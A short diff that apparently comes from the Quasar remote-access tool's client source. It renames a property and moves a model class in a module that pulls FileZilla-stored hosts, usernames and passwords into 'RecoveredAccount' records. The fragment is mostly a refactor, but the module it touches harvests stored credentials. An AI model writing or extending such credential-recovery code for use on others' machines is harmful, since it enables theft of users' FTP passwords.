@@ -1,9 +1,9 @@
-﻿using System;
+﻿using Quasar.Common.Models;
+using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Text;
 using System.Xml;
-using xClient.Core.Data;
 
 namespace xClient.Core.Recovery.FtpClients
 {
@@ -45,7 +45,7 @@ namespace xClient.Core.Recovery.FtpClients
 
                         data.Add(new RecoveredAccount
                         {
-                            URL = szHost,
+                            Url = szHost,
                             Username = szUsername,
                             Password = szPassword,
                             Application = "FileZilla"
@@ -78,7 +78,7 @@ namespace xClient.Core.Recovery.FtpClients
 
                         data.Add(new RecoveredAccount
                         {
-                            URL = szHost,
+                            Url = szHost,
                             Username = szUsername,
                             Password = szPassword,
                             Application = "FileZilla"
